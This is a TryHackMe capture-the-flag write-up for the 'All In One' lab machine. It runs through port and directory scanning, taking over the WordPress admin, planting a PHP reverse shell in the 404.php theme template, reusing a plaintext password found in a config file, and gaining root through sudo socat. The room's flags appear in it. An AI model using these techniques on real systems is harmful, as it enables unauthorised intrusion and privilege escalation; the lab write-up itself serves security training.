# All In One
> Gaurav Raj | TryHackMe

## Nmap Scan
```
[elliot@archlinux]  allinone nmap -sC -sV -A -oN nmap.log 10.10.207.102
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 14:04 IST
Nmap scan report for 10.10.207.102
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.82.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.76 seconds
[elliot@archlinux]  allinone 

```

## Gobuster Scan
```
[elliot@archlinux]  allinone cat gobuster.log      
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.207.102
[+] Method:         GET
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Timeout:        10s
===============================================================
2020/12/10 14:06:17 Starting gobuster in directory enumeration mode
===============================================================
/.hta (Status: 403)        
/.htpasswd (Status: 403)   
/.htaccess (Status: 403)   
/index.html (Status: 200)     
/server-status (Status: 403)  
/wordpress (Status: 301)     
/hackathons (Status: 200) 
===============================================================
2020/12/10 14:09:03 Finished
===============================================================
[elliot@archlinux]  allinone 

```

## HTTP Enumeration

Found `Wordpress` Blog in `/wordpress` directory and hints or creds on `hackathons` directory encoded with `Vigenère Cipher` with key `KeepGoing`

Got Access to the wordpress admin panel

## Reverse Shell
Downloaded `php-rev-shell.php` from pentest monkey github, modified it, then head to the wordpress theme editor section and edited the `404.php` template and place the `shell.php` Content in there, then tried to access a no-existing page with rendered out the `404.php` and got a reverse shell.

### Escalating as user
after getting the reverse shell as `www-data` tried to cat out the user flag but permission denied, then got a `hint.txt` file which was readable which contains
```
Elyana's user password is hidden in the system. Find it ;)
```
used this command to find out the result

`find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"`

```
bash-4.4$ find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"
<e f 2>&1 | grep -v "Permission" | grep -v "No such"
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
```

## User Flag
```
bash-4.4$ cat /etc/mysql/conf.d/private.txt
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
bash-4.4$ su elyana
su elyana
Password: E@syR18ght

bash-4.4$ id
id
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
bash-4.4$ cat /home/elyana/user.txt
cat /home/elyana/user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```

## Privilege Escalation
```
bash-4.4$ sudo -l
sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
bash-4.4$ sudo socat stdin exec:/bin/sh
sudo socat stdin exec:/bin/sh
id
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@elyana:~# cat /root/root.txt | base64 -d
cat /root/root.txt | base64 -d
cat /root/root.txt | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```

## Other Ways
- LFI Vulnerable Site
- Crontab
- Lxd
- upload `shell.php` as `plugin` on wordpress
- generate metasploit payload